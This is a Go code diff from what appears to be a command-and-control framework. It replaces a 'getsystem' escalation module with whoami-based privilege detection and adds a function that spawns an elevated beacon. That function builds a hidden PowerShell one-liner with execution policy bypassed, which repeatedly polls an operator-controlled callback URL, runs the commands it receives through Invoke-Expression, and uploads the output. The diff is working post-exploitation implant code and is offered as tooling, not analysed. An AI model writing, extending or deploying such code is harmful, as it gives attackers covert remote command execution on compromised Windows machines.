+// detectPrivilegeLevelLOLBin detects privilege level using only native Windows commands
+func (is *InteractiveServer) detectPrivilegeLevelLOLBin(sessionID string) (core.PrivilegeLevel, string, error) {
+	// Use native whoami command instead of PowerShell
 	params := map[string]interface{}{
-		"session_id":  sessionID,
-		"Technique":   "NamedPipe",
-		"ServiceName": "",
-		"PipeName":    "",
+		"session_id": sessionID,
 	}
 
 	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 	task := &tasks.Task{
 		ID:         taskID,
-		Type:       "module",
-		Command:    moduleID,
+		Type:       "shell",
+		Command:    "whoami /groups",
 		Parameters: params,
 	}
 	is.server.EnqueueTask(task)
-	fmt.Printf("[+] Queued getsystem module (task: %s)\n", taskID)
-	fmt.Printf("[*] Attempting to elevate to SYSTEM privileges...\n")
-	fmt.Printf("[*] Note: This will attempt elevation even without admin privileges\n")
-	fmt.Printf("[*] If elevation fails, try other privesc modules (bypassuac, ask, etc.) first\n")
-	fmt.Printf("[*] A new session should appear if successful\n")
 
-	// Poll for result with extended timeout (30 seconds for getsystem)
-	is.pollTaskResultWithTimeout(sessionID, taskID, 30*time.Second)
+	// Wait for result
+	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+
+	whoamiTask := is.taskQueue.Get(taskID)
+	if whoamiTask == nil || whoamiTask.Status != "completed" {
+		// Fallback: try whoami without /groups
+		taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
+		task2 := &tasks.Task{
+			ID:         taskID2,
+			Type:       "shell",
+			Command:    "whoami",
+			Parameters: params,
+		}
+		is.server.EnqueueTask(task2)
+		is.pollTaskResultWithTimeout(sessionID, taskID2, 10*time.Second)
+		whoamiTask = is.taskQueue.Get(taskID2)
+	}
+
+	if whoamiTask == nil || whoamiTask.Status != "completed" {
+		return core.PrivilegeUnknown, "", fmt.Errorf("failed to execute whoami command")
+	}
+
+	var output string
+	if whoamiTask.Result != nil {
+		if resultMap, ok := whoamiTask.Result.(map[string]interface{}); ok {
+			if resultValue, ok := resultMap["result"].(string); ok {
+				output = resultValue
+			}
+		}
+	}
+
+	// Use LOLBin escalation helper to parse
+	lolbinEsc := &privesc.LOLBinEscalation{}
+	privLevel, username := lolbinEsc.DetectPrivilegeLevel(output)
+	
+	var privLevelEnum core.PrivilegeLevel
+	switch privLevel {
+	case "system":
+		privLevelEnum = core.PrivilegeSystem
+	case "admin":
+		privLevelEnum = core.PrivilegeAdmin
+	default:
+		privLevelEnum = core.PrivilegeUser
+	}
+
+	return privLevelEnum, username, nil
+}
+
+// getCallbackURL extracts callback URL from session
+func (is *InteractiveServer) getCallbackURL(session *core.Session) string {
+	callbackURL := ""
+	if session.Transport == "http" || session.Transport == "https" {
+		if callbackMeta, ok := session.GetMetadata("callback_url"); ok {
+			if callbackStr, ok := callbackMeta.(string); ok {
+				callbackURL = callbackStr
+			}
+		}
+		if callbackURL == "" {
+			if is.config != nil {
+				protocol := "http"
+				if is.config.Server.TLSEnabled {
+					protocol = "https"
+				}
+				callbackURL = fmt.Sprintf("%s://%s:%d",
+					protocol,
+					is.config.Server.Host,
+					is.config.Server.Port)
+			}
+		}
+	}
+	return callbackURL
+}
+
+// detectPrivilegeLevel detects the current privilege level of a session
+func (is *InteractiveServer) detectPrivilegeLevel(sessionID string) (core.PrivilegeLevel, string, error) {
+	// Execute whoami /groups to detect privilege level
+	params := map[string]interface{}{
+		"session_id": sessionID,
+	}
+
+	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+	task := &tasks.Task{
+		ID:         taskID,
+		Type:       "shell",
+		Command:    "whoami /groups",
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task)
+
+	// Wait for result
+	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
+
+	whoamiTask := is.taskQueue.Get(taskID)
+	if whoamiTask == nil || whoamiTask.Status != "completed" {
+		// Fallback: try whoami without /groups
+		taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
+		task2 := &tasks.Task{
+			ID:         taskID2,
+			Type:       "shell",
+			Command:    "whoami",
+			Parameters: params,
+		}
+		is.server.EnqueueTask(task2)
+		is.pollTaskResultWithTimeout(sessionID, taskID2, 10*time.Second)
+		whoamiTask = is.taskQueue.Get(taskID2)
+	}
+
+	if whoamiTask == nil || whoamiTask.Status != "completed" {
+		return core.PrivilegeUnknown, "", fmt.Errorf("failed to execute whoami command")
+	}
+
+	var output string
+	if whoamiTask.Result != nil {
+		if resultMap, ok := whoamiTask.Result.(map[string]interface{}); ok {
+			if resultValue, ok := resultMap["result"].(string); ok {
+				output = resultValue
+			}
+		}
+	}
+
+	// Parse output to determine privilege level
+	outputLower := strings.ToLower(output)
+	username := ""
+
+	// Extract username
+	if strings.Contains(outputLower, "nt authority\\system") {
+		return core.PrivilegeSystem, "NT AUTHORITY\\SYSTEM", nil
+	}
+
+	// Check for admin groups
+	if strings.Contains(outputLower, "s-1-5-32-544") || // Administrators group SID
+		strings.Contains(outputLower, "administrators") ||
+		strings.Contains(outputLower, "high integrity") {
+		// Extract username from whoami output
+		lines := strings.Split(output, "\n")
+		for _, line := range lines {
+			if strings.Contains(strings.ToLower(line), "user name") {
+				parts := strings.Split(line, ":")
+				if len(parts) > 1 {
+					username = strings.TrimSpace(parts[1])
+				}
+			}
+		}
+		if username == "" {
+			// Try to get from first line
+			if len(lines) > 0 {
+				username = strings.TrimSpace(lines[0])
+			}
+		}
+		return core.PrivilegeAdmin, username, nil
+	}
+
+	// Extract username
+	lines := strings.Split(output, "\n")
+	if len(lines) > 0 {
+		username = strings.TrimSpace(lines[0])
+	}
+
+	return core.PrivilegeUser, username, nil
+}
+
+// spawnElevatedBeacon spawns a new beacon with elevated privileges
+func (is *InteractiveServer) spawnElevatedBeacon(sessionID string, targetPriv core.PrivilegeLevel) error {
+	// Get session to determine callback URL
+	session, ok := is.sessionMgr.GetSession(sessionID)
+	if !ok {
+		return fmt.Errorf("session not found")
+	}
+
+	// Get callback URL from session's transport
+	callbackURL := ""
+	if session.Transport == "http" || session.Transport == "https" {
+		// Extract from session metadata or config
+		if callbackMeta, ok := session.GetMetadata("callback_url"); ok {
+			if callbackStr, ok := callbackMeta.(string); ok {
+				callbackURL = callbackStr
+			}
+		}
+		if callbackURL == "" {
+			// Use default from config
+			if is.config != nil {
+				callbackURL = fmt.Sprintf("%s://%s:%d",
+					is.config.Communication.Protocol,
+					is.config.Server.Host,
+					is.config.Server.Port)
+			}
+		}
+	}
+
+	if callbackURL == "" {
+		return fmt.Errorf("could not determine callback URL for new beacon")
+	}
+
+	// Generate a PowerShell one-liner that spawns a new beacon as SYSTEM
+	// This creates a new process that connects back to the C2 server
+	// We'll use a PowerShell download cradle that connects to the beacon endpoint
+	spawnCmd := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$callback='%s';$id=[System.Guid]::NewGuid().ToString().Substring(0,8);while($true){try{$r=Invoke-WebRequest -Uri \"$callback/beacon\" -Headers @{'X-Session-ID'=$id;'User-Agent'='Mozilla/5.0'} -UseBasicParsing;$j=$r.Content|ConvertFrom-Json;if($j.tasks){foreach($t in$j.tasks){if($t.type-eq'shell'){Invoke-Expression $t.command|Out-String|ConvertTo-Json|$wb=New-Object Net.WebClient;$wb.Headers.Add('X-Session-ID',$id);$wb.UploadString(\"$callback/result\",$_)}}};Start-Sleep -Seconds $j.sleep}catch{Start-Sleep -Seconds 5}}"`, callbackURL)
+
+	// Execute the spawn command in the elevated context
+	params := map[string]interface{}{
+		"session_id": sessionID,
+	}
+
+	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+	task := &tasks.Task{
+		ID:         taskID,
+		Type:       "shell",
+		Command:    spawnCmd,
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task)
+
+	fmt.Printf("[*] Spawn command queued (task: %s). New beacon should connect shortly.\n", taskID)
 	return nil
 }
 
